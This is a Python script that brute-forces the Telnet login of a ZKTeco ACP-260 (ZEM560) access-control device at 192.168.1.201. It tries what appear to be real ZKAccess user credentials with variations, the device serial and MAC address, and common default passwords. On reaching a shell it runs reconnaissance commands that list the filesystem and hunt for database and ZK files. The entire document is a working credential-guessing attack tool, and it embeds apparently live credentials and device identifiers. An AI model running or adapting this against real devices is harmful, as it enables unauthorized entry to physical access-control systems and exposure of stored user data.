"""
Try ZKAccess software credentials on the ZEM560 Telnet login.
The ZKAccess user is ayub@24 / ay305408 — try it and all variations.

Target: ACP-260 (ZEM560) at 192.168.1.201:23
"""

import socket
import time

DEVICE_IP = "192.168.1.201"
TIMEOUT = 3

# ZKAccess credentials and variations
CREDENTIALS = [
    # Exact ZKAccess creds
    ("ayub@24", "ay305408"),
    ("ayub", "ay305408"),
    ("ayub24", "ay305408"),
    # Username as password, password as username
    ("ay305408", "ayub@24"),
    ("ay305408", "ayub"),
    # Common usernames with ZKAccess password
    ("root", "ay305408"),
    ("admin", "ay305408"),
    ("administrator", "ay305408"),
    ("zk", "ay305408"),
    ("operator", "ay305408"),
    # Device serial: BRI3225160081
    ("root", "BRI3225160081"),
    ("admin", "BRI3225160081"),
    # MAC-based: 00:17:61:11:9A:86
    ("root", "001761119A86"),
    ("root", "001761119a86"),
    # Just the numbers
    ("root", "3225160081"),
    ("admin", "3225160081"),
    # ZKAccess common device passwords
    ("root", "0"),
    ("root", "1"),
    ("root", "12"),
    ("root", "123"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456789"),
    ("root", "888888"),
    ("root", "666666"),
    ("root", "111111"),
    ("root", "000000"),
    ("admin", "0"),
    ("admin", "1"),
    ("admin", "123"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "888888"),
    ("admin", "666666"),
]


def recv_all(sock, timeout=2):
    data = b""
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
        except Exception:
            break
    return data


def try_login(username, password):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)

    try:
        sock.connect((DEVICE_IP, 23))
        recv_all(sock, timeout=2)  # banner

        sock.send(f"{username}\r\n".encode())
        recv_all(sock, timeout=1)

        sock.send(f"{password}\r\n".encode())
        time.sleep(1.5)
        resp = recv_all(sock, timeout=2)
        resp_text = resp.decode('ascii', errors='replace')

        if "Login incorrect" in resp_text or "incorrect" in resp_text.lower():
            sock.close()
            return False, "incorrect"

        if "$" in resp_text or "# " in resp_text or "~ " in resp_text or "bash" in resp_text.lower():
            print(f"    *** SHELL PROMPT! ***")
            sock.send(b"echo IN_OK; id; ls /\r\n")
            time.sleep(0.5)
            out = recv_all(sock, timeout=1)
            print(f"    Output: {out.decode('ascii', errors='replace').strip()}")

            sock.send(b"find / -name '*.db' 2>/dev/null\r\n")
            time.sleep(1)
            out = recv_all(sock, timeout=2)
            print(f"    DB files: {out.decode('ascii', errors='replace').strip()}")

            sock.send(b"find / -name 'zk*' -o -name 'ZK*' 2>/dev/null | head -20\r\n")
            time.sleep(1)
            out = recv_all(sock, timeout=2)
            print(f"    ZK files: {out.decode('ascii', errors='replace').strip()}")

            sock.close()
            return True, resp_text

        if "login:" in resp_text.lower():
            sock.close()
            return False, "back to login"

        print(f"    Raw: {repr(resp_text.strip()[:200])}")
        print(f"    Hex: {resp[:100].hex()}")
        sock.close()
        return False, "unknown"

    except Exception as e:
        try: sock.close()
        except: pass
        return False, f"error: {e}"


print("=" * 60)
print(f"ZEM560 LOGIN — ZKAccess creds + variations")
print(f"Trying {len(CREDENTIALS)} combinations")
print("=" * 60)

for username, password in CREDENTIALS:
    pw_display = password if password else "(empty)"
    print(f"  {username:20s} / {pw_display:20s} ... ", end="", flush=True)
    success, detail = try_login(username, password)
    if success:
        print(f"SUCCESS!")
        print(f"\n{'='*60}")
        print(f"  FOUND: {username} / {pw_display}")
        print(f"{'='*60}")
        break
    else:
        print(detail)
    time.sleep(0.3)

print("\nDone.")
